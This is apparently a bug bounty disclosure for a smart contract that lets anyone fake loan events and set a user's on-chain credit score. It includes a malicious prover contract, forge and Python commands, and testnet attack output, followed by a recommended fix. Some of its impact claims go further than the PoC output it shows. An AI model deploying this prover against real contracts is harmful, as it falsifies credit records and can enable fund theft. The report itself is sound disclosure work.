# HIGH — CreditScore.verifyQueryResult Accepts Untrusted Prover, Enabling Arbitrary Credit Score Manipulation

**Program**: SpaceCoin — CertIK SkyShield  
**Severity**: High  
**Category**: Smart Contract — Missing Access Control / Untrusted Input  
**CWE**: CWE-284 (Improper Access Control)  
**Repository**: https://github.com/gluwa/CCNext-smart-contracts  
**File**: `contracts/Loan/CreditScore.sol`  
**Date**: 2026-06-08  
**Related Finding**: CRITICAL_MintableUSCBridge_Untrusted_Prover_Unlimited_Mint.md (same root cause)

---

## Summary

`CreditScore.verifyQueryResult` accepts a user-controlled `proverContract` address with no validation that the prover is trusted or that `queryDetails.principal` is an authorized admin. An attacker deploys a malicious prover that returns crafted `QueryDetails` matching any of the four recognized event selectors, inflating their own credit score to the maximum (900) or deflating any victim's score to the minimum (300) — entirely without having repaid or defaulted on real loans.

---

## Vulnerability Details

### Root Cause

```solidity
// contracts/Loan/CreditScore.sol
function verifyQueryResult(address proverContract, bytes32 queryId) external {
    CreditScoreStorage storage $ = _getCreditScoreStorage();
    if ($.usedQueryId[queryId]) {
        revert("CreditScore: Query ID already used");
    }
    ICreditcoinPublicProver prover = ICreditcoinPublicProver(proverContract); // ← user-controlled, not validated
    ResultSegment[] memory resultSegments = prover.getQueryDetails(queryId).resultSegments;
    bytes32 functionSignature = resultSegments[4].abiBytes;
    ...
    // NO check on queryDetails.principal
    $.usedQueryId[queryId] = true;
    _updateCreditScore(borrower, action);  // ← score updated based on attacker-controlled data
}
```

There is no check that `proverContract` is a trusted/whitelisted address, and no check that `queryDetails.principal` holds an admin role.

### Recognized Event Selectors and Their Actions

| Selector Name | Action | Effect |
|---|---|---|
| `FUND_LOAN_SELECTOR` | 0 | Set score to 300 if first loan |
| `REPAY_LOAN_SELECTOR` | 1 | +1 point (max 900) |
| `LATE_REPAYMENT_SELECTOR` | 2 | -1 point (min 300) |
| `EXPIRED_LOAN_SELECTOR` | 3 | -2 points (min 300) |

---

## Proof of Concept

PoC scripts are in `gluwa/CCNext-smart-contracts` (local testnet only):

- Forge test:   `test/poc_CreditScore_test.sol`
- Forge script: `script/PocCreditScoreManipulation.s.sol`
- Python runner: `poc_credit_score_manipulation.py`

```bash
# Option A — forge test (fastest)
cd ~/CCNext-smart-contracts
forge test --match-test test_creditScoreManipulation -vvvv

# Option B — Python runner (deploys on local Anvil, full end-to-end)
cd ~/CCNext-smart-contracts
python3 ../bug-bounty-reports/SpaceCoin-CertIK/poc_credit_score_manipulation.py
```

### MaliciousScoreProver (deployed by the forge script)

```solidity
contract MaliciousScoreProver {
    bytes32 public immutable selector;  // which event to fake
    address public immutable target;    // whose credit score to manipulate

    constructor(bytes32 _selector, address _target) {
        selector = _selector;
        target   = _target;
    }

    function getQueryDetails(bytes32) external view returns (QueryDetails memory qd) {
        ResultSegment[] memory segs = new ResultSegment[](10);
        segs[4].abiBytes = selector;                               // event selector
        segs[6].abiBytes = bytes32(uint256(uint160(target)));      // EXPIRED_LOAN borrower index
        segs[8].abiBytes = bytes32(uint256(uint160(target)));      // REPAY/LATE borrower index
        segs[9].abiBytes = bytes32(uint256(uint160(target)));      // FUND_LOAN borrower index
        // qd.principal = target — NOT checked by verifyQueryResult
        ...
    }
}
```

### Confirmed PoC Output (local Anvil testnet, 2026-06-08)

```
======================================================================
  SpaceCoin — F2: CreditScore.verifyQueryResult Untrusted Prover PoC
======================================================================

  [deploy] CreditScore: 0x5FbDB2315678afecb367f032d93F642f64180aa3
  --- ATTACK 1: Inflate attacker score (no real loans) ---
  [pre]  attacker score: 0
  [call] verifyQueryResult(FUND_LOAN, attacker)  ->  score initialized to 300
  [mid]  attacker score: 300
  [call] verifyQueryResult(REPAY_LOAN, attacker) x10  ->  +10 points
  [post] attacker score: 310
  --- ATTACK 2: Tank victim score (victim has no loans at all) ---
  [pre]  victim score: 0
  [call] verifyQueryResult(FUND_LOAN, victim)  ->  victim score forced to 300
  [call] verifyQueryResult(REPAY_LOAN, victim) x10  ->  victim boosted to 310
  [call] verifyQueryResult(EXPIRED_LOAN, victim) x5  ->  -10 points (5 x -2)
  [post] victim score: 300
  === ATTACK CONFIRMED ===
  Root cause: verifyQueryResult accepts any proverContract address.
  No check on queryDetails.principal -- any caller fakes any loan event.
  Fix: require(isAuthorizedPrincipal(queryDetails.principal))

======================================================================
  RESULT: VULNERABILITY CONFIRMED
  Both attacks executed without any legitimate loan activity.
======================================================================
```

---

## Impact

1. **Score inflation (self)**: Attacker reaches max credit score (900) without repaying a single loan — misrepresenting creditworthiness.
2. **Score deflation (victim)**: Attacker drives any address to min credit score (300) — reputational damage, exclusion from future credit programs.
3. **Data integrity violation**: The entire credit scoring system becomes untrustworthy; on-chain proof of loan history is meaningless.
4. **Future escalation**: If credit score is used to gate loan amounts or collateral requirements in future contract upgrades, this vulnerability directly enables fund theft.

---

## Comparison with the Critical Finding

The same missing check present in `MintableUSCBridge.mintFromQuery` is present here. Both contracts call `ICreditcoinPublicProver(proverContract).getQueryDetails(queryId)` on a user-supplied address without checking `queryDetails.principal`. The secure pattern (`require(hasRole(DEFAULT_ADMIN_ROLE, queryDetails.principal))`) from `UniversalBridgeProxy` is absent in both.

---

## Recommendation

Same fix as the Critical finding:

```solidity
function verifyQueryResult(address proverContract, bytes32 queryId) external {
    CreditScoreStorage storage $ = _getCreditScoreStorage();
    if ($.usedQueryId[queryId]) revert("CreditScore: Query ID already used");

    ICreditcoinPublicProver prover = ICreditcoinPublicProver(proverContract);
    QueryDetails memory qd = prover.getQueryDetails(queryId);

+   // Only accept queries verified by authorized principals
+   require(isAuthorizedPrincipal(qd.principal), "Untrusted query principal");

    ResultSegment[] memory resultSegments = qd.resultSegments;
    ...
}
```

Or whitelist `proverContract` addresses via an admin-controlled mapping.

---

## Submission Metadata

- **Wallet**: `0x3fba877c0927B16f5A6568Ebc1db286324dA9c2b`
- **Email**: willworachat@gmail.com
- **Tested on**: Static analysis + local simulation
